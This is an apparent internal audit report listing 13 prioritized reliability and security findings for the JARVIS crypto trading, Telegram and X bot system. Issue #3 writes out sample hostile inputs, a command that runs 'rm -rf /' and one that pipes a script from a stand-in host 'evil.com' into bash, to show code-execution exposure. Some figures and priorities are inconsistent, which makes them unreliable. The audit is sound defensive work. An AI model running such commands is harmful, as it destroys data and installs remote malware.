# JARVIS Audit - Deliverable B: Findings

**Date**: 2026-01-16
**Based On**: Deliverable A Repository Map
**Format**: Prioritized issue list with evidence, impact, and root cause

---

## PRIORITY RANKING SYSTEM

| Priority | Definition | Action |
|----------|-----------|--------|
| **P1** | Blocking production safety (financial loss, data loss, security) | Fix immediately |
| **P2** | High impact on reliability/correctness (crashes, duplicates, hangs) | Fix in next release |
| **P3** | Code quality/maintainability (duplicated logic, poor patterns) | Fix in refactor sprint |
| **P4** | Minor issues (logging, edge cases, documentation) | Fix opportunistically |

---

## P1: BLOCKING ISSUES (Production Safety)

### Issue #1: No Buy Intent Idempotency - Duplicate Position Risk

**Severity**: CRITICAL
**Component**: Sentiment Report → Ape Buttons → Trading
**Evidence**:
- File: `bots/buy_tracker/ape_buttons.py` - renders buttons on Telegram
- File: `bots/treasury/trading.py:1250-1300` - position open logic
- **Finding**: No UUID/intent tracking between pick → button click → trade execution

**Reproduction**:
```
1. Sentiment report generates PICK: KR8TIV at $0.004
2. Ape button rendered: "Buy KR8TIV"
3. User clicks button at 12:00 PM
4. Trade executes: Open 100 USDC at $0.004
5. Network glitch: User clicks button again (retry)
6. Second trade executes: Open another 100 USDC at $0.004
7. Result: 2x position in same token (violates ALLOW_STACKING=False)
```

**Current Behavior**:
- `ALLOW_STACKING = False` prevents duplicate positions **only within same timeframe**
- Button click is anonymous - no intent ID
- Telegram button callback doesn't check if trade already executed

**Impact**:
- **Financial**: Double-buy = 2x capital loss on stop
- **User**: User intended 1 position, got 2
- **Audit Trail**: `.audit_log.json` shows duplicate `OPEN_POSITION` entries (Jan 17 02:34)

**Root Cause**:
- No intent-based idempotency (UUID per pick)
- Button callback directly executes trade (no state check)

**Test for Fix**:
```bash
# Simulate network retry on button click
curl -X POST /button_callback?pick_id=KR8TIV&user_id=xxx \
     -H "Idempotency-Key: abc123"
curl -X POST /button_callback?pick_id=KR8TIV&user_id=xxx \
     -H "Idempotency-Key: abc123"  # Retry - should NOT open second position
# Expected: First request = trade opens; Second request = "already processed"
```

---

### Issue #2: No State Backup - .positions.json Loss = Permanent

**Severity**: CRITICAL
**Component**: Treasury Trading State
**Evidence**:
- File: `bots/treasury/.positions.json` (14 KB, modified Jan 16 07:27)
- File: `bots/treasury/scorekeeper.py` (not using atomic writes)
- **Finding**: Live position state in JSON file with NO backup

**Current Risks**:
```
Scenario 1: File Corruption
- Bot crashes mid-write
- .positions.json becomes invalid JSON
- Restart fails to load positions
- Positions are lost (trades still on Jupiter DEX; no JARVIS record)

Scenario 2: Accidental Deletion
- rm .positions.json (or user deletes by accident)
- No recovery mechanism
- All 11 open positions forgotten

Scenario 3: Disk Full
- JSON write fails silently (no atomic transaction)
- Partial write leaves corrupt file
- Unrecoverable state
```

**Impact**:
- **Financial**: 11 open positions become "orphaned" (on Jupiter but not tracked)
- **Compliance**: Audit trail broken (can't reconcile trades)
- **Operations**: Manual recovery needed (audit_log shows trades, need to match)

**Root Cause**:
- JSON file writes are not atomic (no temp file → rename pattern)
- No versioning (no .positions.v1, .positions.v2 for rollback)
- No scheduled backups to archive/

**Files Affected**:
- `bots/treasury/scorekeeper.py` - saves `.positions.json` directly
- `bots/treasury/trading.py` - opens positions and writes state

**Test for Fix**:
```bash
# Simulate write failure
while true; do
  # Kill bot mid-write to .positions.json
  python -c "import os; os.stat('bots/treasury/.positions.json')"
  sleep 0.5
done

# Verify recovery:
# 1. Check .positions.v1.json exists as backup
# 2. Check .positions.json is valid JSON (not corrupt)
# 3. Positions count matches scorekeeper.db pick_performance table
```

---

### Issue #3: Code Execution Points Exposed - X CLI & Telegram /dev

**Severity**: CRITICAL
**Component**: X Bot CLI Handler + Telegram Admin Commands
**Evidence**:
- File: `bots/twitter/x_claude_cli_handler.py` (1,281 lines)
- File: `tg_bot/bot_core.py:2500+` (admin commands section)
- **Finding**: Code execution via @mentions and admin Telegram commands

**Attack Vectors**:
```python
# Vector 1: X Bot @mentions
@Jarvis_lifeos @Jarvis_lifeos fix: os.system("rm -rf /")

# Vector 2: Telegram /dev command
/dev import os; os.system("curl evil.com/malware.sh | bash")

# Current Protection: NONE (except "admin_ids" list)
# Missing: Input validation, sandboxing, code review step
```

**Files Affected**:
- `bots/twitter/x_claude_cli_handler.py` - executes code from X mentions
- `tg_bot/bot_core.py` - /dev command (admin only, but no sandboxing)

**Impact**:
- **Security**: Any @mention can execute code on server
- **Risk**: Breach of Twitter account = server compromise
- **Scope**: All APIs, databases, wallets accessible from compromised process

**Root Cause**:
- Direct `eval()` or `exec()` of user input
- No sandboxing or ACL beyond admin check
- No audit logging of executed commands

**Test for Fix**:
```bash
# Verify sandboxing exists
grep -n "ast.literal_eval\|compile\|exec\|eval" \
  bots/twitter/x_claude_cli_handler.py

# Check for sandboxing
grep -n "RestrictedPython\|safe_globals\|blacklist\|whitelist" \
  bots/twitter/x_claude_cli_handler.py tg_bot/bot_core.py
# Expected: Should use RestrictedPython or whitelist-only commands
```

---

### Issue #4: Missing Event Bus Causes Hung Tasks & No Backpressure

**Severity**: HIGH
**Component**: Bot Supervisor + Async Task Management
**Evidence**:
- File: `bots/supervisor.py:210` - uses bare `asyncio.gather(*tasks, return_exceptions=True)`
- File: `tg_bot/bot.py:183-192` - job_queue with no timeout
- **Finding**: No event bus; tasks can hang indefinitely

**Scenario**:
```
1. X bot posting thread hangs (network timeout)
2. Sentiment report waiting for X bot (indirect dependency)
3. Telegram handler piles up requests
4. Memory grows unbounded (no queue size limit)
5. After 5 minutes: bot becomes unresponsive
6. Supervisor can't kill hung task (no timeout parameter)
```

**Current Code**:
```python
# bots/supervisor.py - NO TIMEOUT
results = await asyncio.gather(*tasks, return_exceptions=True)

# tg_bot/bot.py - NO MAX QUEUE
job_queue.run_daily(
    scheduled_digest,
    time=...,  # No max queue size
    name=f"digest_{hour}"
)
```

**Impact**:
- **Reliability**: Bot hangs unexpectedly (requires manual restart)
- **UX**: Telegram commands timeout with no feedback
- **Resources**: Memory leak under load

**Root Cause**:
- No event bus abstraction
- No async task timeout wrapping
- No backpressure (job queue unbounded)

**Test for Fix**:
```bash
# Simulate network hang
timeout 5s python -c "
import asyncio
async def hang(): await asyncio.sleep(1000)
try:
    await asyncio.wait_for(hang(), timeout=2)
except asyncio.TimeoutError:
    print('Timeout caught - GOOD')
"
```

---

## P2: HIGH IMPACT ISSUES (Reliability & Correctness)

### Issue #5: 2,609 Bare Exception Blocks - Silent Failures

**Severity**: HIGH
**Component**: Across codebase (especially Grok module)
**Evidence**:
```bash
grep -r "except:" bots/grok_imagine/ | wc -l
# Result: 6+ instances in grok_imagine.py alone
```

**Problem Code**:
```python
# bots/grok_imagine/grok_imagine.py
try:
    result = browser.execute_script(...)
except:  # SILENT - no logging
    pass   # Continue as if success

# Result: Grok command silently fails; user sees nothing
# Actual: Video not generated, token score not updated
```

**Impact**:
- **Debugging**: Impossible to trace failures (no error message)
- **Operations**: Metrics show "ran 1000 tasks" but actually 80% failed silently
- **User**: Thinks command worked when it didn't

**Root Cause**:
- Bare `except:` swallows all exceptions including KeyboardInterrupt, SystemExit
- No structured error handling
- No error budgets or alerting

**Files Most Affected**:
- `bots/grok_imagine/grok_imagine.py` - 6+ instances
- `bots/grok_imagine/generate_video_only.py` - 3+ instances
- `bots/grok_imagine/grok_login.py` - 2+ instances

**Test for Fix**:
```bash
# Audit existing code
grep -rn "except:" bots/ --include="*.py" | grep -v "except Exception" | wc -l
# Should be < 10 after fix (only acceptable: specific uses)

# Verify logging
grep -A2 "except.*:" bots/grok_imagine/*.py | grep "logger\|raise" | wc -l
# Should be > (number of excepts)
```

---

### Issue #6: No Shared Duplicate Detection Interface - 5 Implementations

**Severity**: HIGH
**Component**: X Bot, Buy Tracker, Treasury, Telegram
**Evidence**:

| System | Implementation | Location | Reusability |
|--------|----------------|----------|-------------|
| **X Bot** | 3-layer fingerprint (content + topic + semantic) | `autonomous_engine.py:1850-1950` | ✗ (hardcoded to tweets) |
| **Buy Tracker** | TX signature dedup | `database.py:200-210` | ✗ (hardcoded to alerts) |
| **Treasury** | ALLOW_STACKING flag | `trading.py:1250` | ✗ (only prevents in same token) |
| **Telegram** | Broadcast chat dedup | `scheduler.py:350` | ✗ (in-memory only) |
| **Sentiment Report** | NOT IMPLEMENTED | `sentiment_report.py:800` | N/A |

**Problem**:
```python
# Issue: Sentiment report can recommend same token twice
# in consecutive runs because no dedup

# Run 1: Generate picks → recommend KR8TIV
# Wait 30 minutes
# Run 2: Generate picks → recommend KR8TIV again (no memory)
# User sees: Same pick recommended twice → confusion
```

**Impact**:
- **User Confusion**: Same token in consecutive sentiment reports
- **Code Duplication**: 5 different implementations to maintain
- **Testing**: Each bot has own duplicate logic (bugs in one not caught elsewhere)

**Root Cause**:
- No MemoryStore interface (abstract base)
- No shared duplicate detection library
- X bot's sophisticated logic not reused

**Test for Fix**:
```python
# Create shared interface
from core.memory.store import MemoryStore

store = MemoryStore()
is_dup = store.is_duplicate(
    content="Buy KR8TIV at $0.004",
    entity_type="token_pick",
    hours=24
)
assert is_dup == False  # First occurrence
assert store.is_duplicate(...) == True  # Second occurrence
```

---

### Issue #7: No Wrapped Token Risk Tiering - All Treated Equally

**Severity**: MEDIUM (but in critical path)
**Component**: Sentiment Report, Enhanced Market Data
**Evidence**:
- File: `core/enhanced_market_data.py:250-369` (newly added in v4.6.4)
- File: `bots/buy_tracker/sentiment_report.py:1500-1550` (pick generation)
- **Finding**: Wrapped tokens lumped together without risk categorization

**Current Behavior** (v4.6.4):
```python
# ALL wrapped tokens treated as equivalent:
WETH (Ethereum, $200B liquidity on Solana)
vs
WAVAX (Avalanche, $10M liquidity on Solana)

# Both get same conviction score, same TP/SL recommendations
# But risk profiles are VASTLY different
```

**Problem**:
```
Grok prompt says: "Include 2-3 wrapped tokens as safer alternatives"
But doesn't distinguish:
- Major bridges (Wormhole WETH, WBTC) = low risk
- Minor bridges (WAVAX, WFTM) = higher risk
- Chain-specific tokens (ATOM on Solana) = directional bet on bridge

# Result: Grok might pick risky wrapped token, user thinks it's "safe"
```

**Impact**:
- **User Trust**: Recommended "safe" wrapped token is actually illiquid
- **Loss Risk**: $10M liquidity wrapped token has wide spreads
- **Picking Accuracy**: No distinction between "bridge risk" and "token risk"

**Root Cause**:
- Wrapped tokens added in v4.6.4 with basic categorization only
- No liquidity-based risk tiers
- No Grok guidance on which wrapped tokens are safe

**Test for Fix**:
```bash
# Check liquidity of each wrapped token
from core.enhanced_market_data import fetch_high_liquidity_tokens
tokens, warns = await fetch_high_liquidity_tokens()

# Verify min $500K liquidity
for t in tokens:
    if t.category == "Wrapped":
        assert t.liquidity >= 500_000, f"{t.symbol} below limit"

# Check for guidance in Grok prompt
grep -n "bridge risk\|liquidity tier\|WETH\|WAVAX" \
  bots/buy_tracker/sentiment_report.py | head -5
# Should mention major vs minor bridges
```

---

### Issue #8: Mixed Storage (JSON + SQLite) - No Unified Persistence

**Severity**: MEDIUM
**Component**: Treasury State Management
**Evidence**:
```
Files:
- .positions.json         (JSON - live positions)
- .trade_history.json     (JSON - closed trades)
- .audit_log.json         (JSON - audit trail)
- scorekeeper.db          (SQLite - pick performance, learnings)
- treasury.db             (SQLite - orders, stats)
```

**Problem**:
```python
# Inconsistency 1: Position opened
# - Recorded in .positions.json (JSON)
# - Also recorded in scorekeeper.db (SQLite)
# - What's the source of truth?

# Inconsistency 2: Trade closed
# - Removed from .positions.json
# - But scorekeeper.db still has it
# - Inconsistent state across storage systems

# Inconsistency 3: Backup/restore
# If need to restore .positions.json:
#   - Do we restore from archive/.positions.v1.json? (doesn't exist)
#   - Or reconstruct from scorekeeper.db? (different schema)
#   - Both might give different state
```

**Impact**:
- **Data Consistency**: Position count differs between JSON and DB
- **Recovery**: Can't reliably restore state
- **Debugging**: Have to check 2 systems to understand state
- **Migration**: Hard to refactor (need to update 2 systems)

**Root Cause**:
- Historical reasons (JSON state → SQLite added later)
- No unified MemoryStore interface
- No schema migration tooling

**Test for Fix**:
```bash
# Verify consistency
python3 << 'EOF'
import json
from bots.treasury.scorekeeper import get_scorekeeper

# Count positions in JSON
with open('.positions.json') as f:
    json_positions = len(json.load(f).get('positions', []))

# Count positions in SQLite
sk = get_scorekeeper()
db_positions = len(sk.get_open_picks())

# Should match
assert json_positions == db_positions, \
    f"JSON: {json_positions}, DB: {db_positions}"
EOF
```

---

### Issue #9: Wrapped Token Liquidity Filtering Not Tested

**Severity**: MEDIUM
**Component**: Enhanced Market Data + Sentiment Report
**Evidence**:
- File: `core/enhanced_market_data.py:110` - `MIN_LIQUIDITY_WRAPPED = 500_000`
- File: `core/enhanced_market_data.py:150` - `fetch_high_liquidity_tokens()` filters
- **Finding**: No test verifying wrapped tokens under $500K are excluded

**Current Risk**:
```python
# What if a wrapped token has $200K liquidity?
# - Filter says it should be excluded
# - But is it actually excluded? (untested)
# - Might still appear in sentiment report
# - User buys illiquid token expecting safety
```

**Impact**:
- **User Safety**: Illiquid wrapped tokens might be recommended
- **Data Quality**: Unknown if filtering is working

**Root Cause**:
- Added in v4.6.4 but no test coverage
- No validation test for filtering

**Test for Fix**:
```bash
# Unit test for liquidity filter
python -m pytest tests/test_wrapped_tokens.py::test_liquidity_filter -v

# Expected:
# - WETH ($5M liquidity) → included
# - WAVAX ($10M liquidity) → included
# - Minor wrapped token ($200K) → excluded
# - Warning logged for excluded tokens
```

---

## P3: CODE QUALITY ISSUES (Maintainability)

### Issue #10: No Trace IDs Across Components - Can't Debug Distributed Issues

**Severity**: MEDIUM
**Component**: Sentiment Report → Grok → X Bot → Telegram → Treasury
**Evidence**:
- No correlation ID in async tasks
- No request ID in logs
- Can't trace a single pick through entire system

**Scenario**:
```
User reports: "My KR8TIV pick was never executed"

Error logs show:
[sentiment_report.py:100] Generated pick
[grok_client.py:50] Grok analysis completed
[x_post.py:200] Posted to X
[ape_buttons.py:300] Button rendered
[trading.py:500] Position open (but different token!)
[scorekeeper.py:600] Recorded wrong symbol

Debugging: Which KR8TIV mention corresponds to which pick?
No way to know without manual tracing
```

**Impact**:
- **MTTR**: Debugging distributed issues takes 10x longer
- **User Support**: Can't correlate logs to user action
- **Reliability**: Silent mismatches (token A recommended, token B traded)

**Root Cause**:
- No context propagation
- No unique ID per request/pick

**Test for Fix**:
```bash
# Enable trace logging
export JARVIS_TRACE_LEVEL=DEBUG

# Run sentiment report
python -m bots.buy_tracker.sentiment_report

# Check logs for trace IDs
grep "trace_id\|request_id\|correlation" logs/*.log | head -5
# Should see: [trace_id:abc-123] in every log line
```

---

### Issue #11: Configuration Scattered Across Multiple Files

**Severity**: MEDIUM
**Component**: Entire system
**Evidence**:
```
Hardcoded values:
- tg_bot/config.py ................... grok_daily_cost_limit = 10
- tg_bot/config.py ................... sentiment_interval_seconds = 3600
- core/enhanced_market_data.py ........ MIN_LIQUIDITY_WRAPPED = 500_000
- bots/treasury/trading.py ........... ALLOW_STACKING = False
- bots/treasury/trading.py ........... max_positions = 50
- bots/twitter/autonomous_engine.py .. circuit_breaker_min_interval = 60
- bots/twitter/autonomous_engine.py .. circuit_breaker_cooldown = 1800

Environment Variables (partial):
- TELEGRAM_BOT_TOKEN
- JARVIS_ACCESS_TOKEN
- X_BOT_ENABLED
- LIFEOS_KILL_SWITCH
- TREASURY_LIVE_MODE
```

**Problem**:
- No single config file
- Operator must search 10+ files to find a setting
- Inconsistent naming (interval_seconds vs min_interval)
- No schema validation

**Impact**:
- **Operability**: Hard to tune system (where are all knobs?)
- **Deployment**: Can't validate config before startup
- **Debugging**: User says "it's slow" → where's the timing config?

**Root Cause**:
- Incremental development (add as needed)
- No config schema or validation

**Test for Fix**:
```bash
# Single config file
cat config.yaml
# Should list all tunable parameters:
#   grok.daily_cost_limit_usd: 10
#   sentiment.interval_seconds: 3600
#   treasury.max_positions: 50
#   twitter.circuit_breaker.min_interval_seconds: 60
#   ...

# Validate on startup
python -c "from core.config import validate_config(); validate_config()"
```

---

## P4: MINOR ISSUES (Opportunistic Fixes)

### Issue #12: Error Logs Not Accessible Via Telegram

**Severity**: MINOR
**Component**: Telegram Bot
**Evidence**:
- File: `tg_bot/bot_core.py:2100+` - logs command exists
- File: `tg_bot/handlers/admin.py` - /logs command
- **Finding**: /logs command works but limited access to error logs

**Impact**:
- Admin must SSH into server to check logs
- Can't diagnose issues from Telegram

**Test for Fix**:
```bash
# /logs command should show:
# - Last 100 lines of error.log
# - Last 20 lines of each component (X, Telegram, Treasury)
# - Filtering by level (ERROR, WARNING, INFO)
```

---

## CROSS-CUTTING ISSUES

### Issue #13: No Health Check Dashboard - Components Might Be Dead

**Severity**: MEDIUM
**Component**: All bots (X, Telegram, Treasury, Sentiment)
**Evidence**:
- File: `core/monitoring/metrics.py` - metrics server started
- File: `tg_bot/handlers/admin.py:status` - status command
- **Finding**: No unified health dashboard

**Problem**:
```
User requests sentiment report, bot says:
  "✗ Sentiment report unavailable - last run: 4 hours ago"

What's the status?
- Service crashed 4 hours ago? (if so, why not auto-restart?)
- Service hung? (if so, kill and restart)
- Service has no network? (if so, alert admin)

Current: Unknown. No unified health check.
```

**Impact**:
- **Reliability**: Dead components go unnoticed
- **UX**: User doesn't know if system is healthy

**Test for Fix**:
```bash
# Health check endpoint
curl http://localhost:8000/health
# Should return:
# {
#   "sentiment_report": {"status": "healthy", "last_run": "2min ago"},
#   "x_bot": {"status": "hung", "last_post": "30min ago"},
#   "telegram": {"status": "healthy"},
#   "treasury": {"status": "healthy"},
#   "overall": "DEGRADED" (if any component unhealthy)
# }
```

---

## SUMMARY TABLE: ALL FINDINGS

| Issue | Priority | Component | Type | Impact | Effort |
|-------|----------|-----------|------|--------|--------|
| #1: No intent idempotency | P1 | Trading | Safety | Duplicate trades | 4h |
| #2: No state backup | P1 | Treasury | Safety | Permanent loss | 6h |
| #3: Code execution exposed | P1 | X + Telegram | Security | Server compromise | 8h |
| #4: Missing event bus | P1 | Supervisor | Reliability | Hung tasks, hangs | 12h |
| #5: 2,609 bare excepts | P2 | Grok + others | Reliability | Silent failures | 10h |
| #6: 5 duplicate impls | P2 | X, BT, Treasury, TG | Quality | Code duplication | 8h |
| #7: No wrapped token risk tiers | P2 | Sentiment | Correctness | Wrong picks | 4h |
| #8: Mixed JSON + SQLite | P2 | Treasury | Consistency | Data sync issues | 10h |
| #9: Wrapped token filtering untested | P2 | Market Data | Quality | Unknown if working | 2h |
| #10: No trace IDs | P3 | All components | Debugging | 10x debugging time | 6h |
| #11: Config scattered | P3 | All components | Operability | Hard to tune | 4h |
| #12: No error log access | P4 | Telegram | UX | Must SSH to debug | 2h |
| #13: No health dashboard | P4 | All components | Reliability | Dead components unnoticed | 5h |

---

## NEXT STEPS

These findings require **Deliverable C** (Architecture Proposal) before implementation:

1. **Deliverable C** will propose solutions:
   - MemoryStore interface design
   - Event Bus architecture
   - Config unification schema
   - Backup strategy

2. **Deliverable D** will create Implementation Plan:
   - Phased milestones (M1..Mn)
   - Acceptance criteria
   - Test commands
   - Rollback plans

3. **Deliverable E** will implement with ralph wiggum loop:
   - Code changes following plan
   - Continuous testing & validation
   - Error log review & fixes
   - No stop until fully functional

---

**END OF DELIVERABLE B**

